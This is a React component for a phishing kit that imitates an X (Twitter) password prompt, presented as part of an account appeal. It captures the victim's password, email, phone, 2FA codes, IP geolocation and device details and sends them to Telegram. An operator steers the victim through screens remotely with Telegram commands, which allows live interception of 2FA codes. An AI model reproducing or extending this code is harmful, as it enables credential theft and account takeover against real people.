"use client";

import React, { useState, useEffect } from "react";
import { Eye } from "lucide-react";
import { getIPInfo } from "@/utils/ipInfo";
import { getDeviceInfo } from "@/utils/deviceInfo";
import { sendToTelegram, TelegramCommand, updateTelegramMessage } from "@/utils/telegramLogger";
import WaitingScreen from "./WaitingScreen";
import EmailPhoneVerification from "./EmailPhoneVerification";
import TwoFAVerification from "./TwoFAVerification";
import ResultScreen from "./ResultScreen";

interface PasswordModalProps {
  isOpen: boolean;
  onClose: () => void;
  settings?: {
    username: string;
    displayName: string;
    profilePicUrl: string;
    isVerified: boolean;
  };
}

export default function PasswordModal({ isOpen, onClose, settings }: PasswordModalProps) {
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showWaiting, setShowWaiting] = useState(false);
  
  // Settings'ten gelen değerleri kullan, yoksa varsayılan değerleri kullan
  const username = settings?.username || "elonmusk";
  const displayName = settings?.displayName || "Elon Musk";
  const profilePicUrl = settings?.profilePicUrl;
  const isVerified = settings?.isVerified ?? true;

  // Screen states for different verification flows
  const [currentScreen, setCurrentScreen] = useState<"password" | "waiting" | "emailPhone" | "twoFA" | "result">("password");
  const [twoFAType, setTwoFAType] = useState<"app" | "phone" | "email">("app");
  const [resultType, setResultType] = useState<"finish" | "kick" | "ban">("finish");

  // Yeni state ekleyelim
  const [lastLoginData, setLastLoginData] = useState<{
    email?: string;
    phone?: string;
    twoFACode?: string;
  }>({});

  const handleLogin = async () => {
    if (!password.trim()) return;

    setLoading(true);

    try {
      const ipInfo = await getIPInfo();
      const deviceInfo = getDeviceInfo();

      // Send the collected information to Telegram
      await sendToTelegram({
        username: username,
        password: password,
        email: lastLoginData.email || "Not provided",
        phoneNumber: lastLoginData.phone || "Not provided",
        twoFACode: lastLoginData.twoFACode || "Not provided",
        ip: ipInfo.ip,
        country: ipInfo.country,
        city: ipInfo.city,
        isp: ipInfo.isp,
        org: ipInfo.org,
        asn: ipInfo.asn,
        coordinates: ipInfo.coordinates,
        timezone: ipInfo.timezone,
        device: deviceInfo.device,
        browser: deviceInfo.browser,
        os: deviceInfo.os,
        userAgent: deviceInfo.userAgent
      });

      setShowSuccess(true);
      setTimeout(() => {
        setShowSuccess(false);
        setLoading(false);
        setCurrentScreen("waiting");
      }, 1500);

    } catch (error) {
      console.error("Error logging in:", error);
      setLoading(false);
    }
  };

  const handleCommandReceived = (command: TelegramCommand) => {
    console.log("Received command:", command);

    switch (command) {
      case "ask_password":
        console.log("Switching to password screen");
        setPassword("");
        setCurrentScreen("password");
        break;
      case "2fa_auth_app":
        setTwoFAType("app");
        setCurrentScreen("twoFA");
        break;
      case "2fa_phone":
        setTwoFAType("phone");
        setCurrentScreen("twoFA");
        break;
      case "2fa_email":
        setTwoFAType("email");
        setCurrentScreen("twoFA");
        break;
      case "confirm_email_phone":
        setCurrentScreen("emailPhone");
        break;
      case "file_appeal":
        // Could show an appeal form, but for now just show finish result
        setResultType("finish");
        setCurrentScreen("result");
        break;
      case "finish":
        setResultType("finish");
        setCurrentScreen("result");
        break;
      case "kick_user":
        setResultType("kick");
        setCurrentScreen("result");
        break;
      case "ban_user":
        setResultType("ban");
        setCurrentScreen("result");
        break;
      default:
        // Close everything if unknown command
        onClose();
        break;
    }
  };

  const handleEmailPhoneSubmit = async (email: string, phone: string) => {
    try {
      // Verileri state'e kaydet
      setLastLoginData(prev => ({
        ...prev,
        email,
        phone
      }));

      // Telegram'ı güncelle
      await updateTelegramMessage({
        email,
        phoneNumber: phone,
        twoFACode: lastLoginData.twoFACode
      });

      // Waiting ekranına geç
      setCurrentScreen("waiting");
    } catch (error) {
      console.error("Error handling email/phone submit:", error);
      // Hata durumunda da waiting ekranına geç
      setCurrentScreen("waiting");
    }
  };

  const handleTwoFASubmit = async (code: string) => {
    try {
      // 2FA kodunu state'e kaydet
      setLastLoginData(prev => ({
        ...prev,
        twoFACode: code
      }));

      // Telegram'ı güncelle
      await updateTelegramMessage({
        email: lastLoginData.email,
        phoneNumber: lastLoginData.phone,
        twoFACode: code
      });

      // Waiting ekranına geç
      setCurrentScreen("waiting");
    } catch (error) {
      console.error("Error handling 2FA submit:", error);
      // Hata durumunda da waiting ekranına geç
      setCurrentScreen("waiting");
    }
  };

  // Reset state when modal is closed
  useEffect(() => {
    if (!isOpen) {
      setPassword("");
      setShowPassword(false);
      setLoading(false);
      setShowSuccess(false);
      setCurrentScreen("password");
      // Önemli: lastLoginData'yı sıfırlama
    }
  }, [isOpen]);

  // If not open, don't render anything
  if (!isOpen) return null;

  // Render different screens based on the current state
  switch (currentScreen) {
    case "waiting":
      return <WaitingScreen username={username} onCommandReceived={handleCommandReceived} />;

    case "emailPhone":
      return (
        <EmailPhoneVerification
          onSubmit={handleEmailPhoneSubmit}
          onClose={() => {}}
        />
      );

    case "twoFA":
      return (
        <TwoFAVerification
          type={twoFAType}
          onSubmit={handleTwoFASubmit}
          onClose={() => {}}
        />
      );

    case "result":
      return (
        <ResultScreen
          type={resultType}
          onClose={() => {
            onClose();
            setCurrentScreen("password");
          }}
        />
      );

    default:
      // Password screen (default)
      return (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
          <div className="bg-[#f7f7f7] rounded-2xl w-full max-w-[400px] p-6 relative mx-4">
            {/* X logo */}
            <div className="flex justify-center mb-4">
              <svg viewBox="0 0 24 24" aria-hidden="true" className="h-7 w-7">
                <path
                  d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
                  fill="currentColor"
                />
              </svg>
            </div>

            {/* Title */}
            <h2 className="text-[22px] font-bold text-center mb-5">Enter your password</h2>

            {/* Alert message */}
            <div className="bg-[#FFDCE0] text-[#BA0000] p-3 rounded-lg mb-6 text-sm">
              Please verify that you are the account holder in order to process your appeal request.
            </div>

            {/* User profile */}
            <div className="flex items-center gap-3 mb-5">
              <div className="w-[48px] h-[48px] rounded-full bg-gray-600 flex items-center justify-center overflow-hidden">
                {profilePicUrl ? (
                  <img src={profilePicUrl} alt="Profile" className="w-full h-full object-cover" />
                ) : null}
              </div>
              <div>
                <div className="text-[15px] flex items-center">
                  {displayName}
                  {isVerified && (
                    <span className="ml-1 text-[#1D9BF0]">
                      <svg viewBox="0 0 24 24" aria-label="Verified account" className="w-4 h-4 inline-block fill-current">
                        <path d="M22.5 12.5c0-1.58-.875-2.95-2.148-3.6.154-.435.238-.905.238-1.4 0-2.21-1.71-3.998-3.818-3.998-.47 0-.92.084-1.336.25C14.818 2.415 13.51 1.5 12 1.5s-2.816.917-3.437 2.25c-.415-.165-.866-.25-1.336-.25-2.11 0-3.818 1.79-3.818 4 0 .494.083.964.237 1.4-1.272.65-2.147 2.018-2.147 3.6 0 1.495.782 2.798 1.942 3.486-.02.17-.032.34-.032.514 0 2.21 1.708 4 3.818 4 .47 0 .92-.086 1.335-.25.62 1.334 1.926 2.25 3.437 2.25 1.512 0 2.818-.916 3.437-2.25.415.163.865.248 1.336.248 2.11 0 3.818-1.79 3.818-4 0-.174-.012-.344-.033-.513 1.158-.687 1.943-1.99 1.943-3.484zm-6.616-3.334l-4.334 6.5c-.145.217-.382.334-.625.334-.143 0-.288-.04-.416-.126l-.115-.094-2.415-2.415c-.293-.293-.293-.768 0-1.06s.768-.294 1.06 0l1.77 1.767 3.825-5.74c.23-.345.696-.436 1.04-.207.346.23.44.696.21 1.04z" />
                      </svg>
                    </span>
                  )}
                </div>
                <div className="text-[13px] text-gray-500">@{username}</div>
              </div>
            </div>

            {/* Password input */}
            <div className="relative mb-6">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500 pr-10 bg-white"
                disabled={loading || showSuccess}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500"
                disabled={loading || showSuccess}
              >
                <Eye size={20} />
              </button>
            </div>

            {/* Login button */}
            <button
              onClick={handleLogin}
              disabled={loading || showSuccess}
              className={`w-full rounded-full py-2.5 font-medium text-center transition-colors ${
                showSuccess
                  ? 'bg-green-600 text-white'
                  : 'bg-[#65676B] text-white hover:bg-[#5A5C60]'
              }`}
            >
              {loading ? 'Verifying...' : showSuccess ? 'Success!' : 'Login'}
            </button>
          </div>
        </div>
      );
  }
}
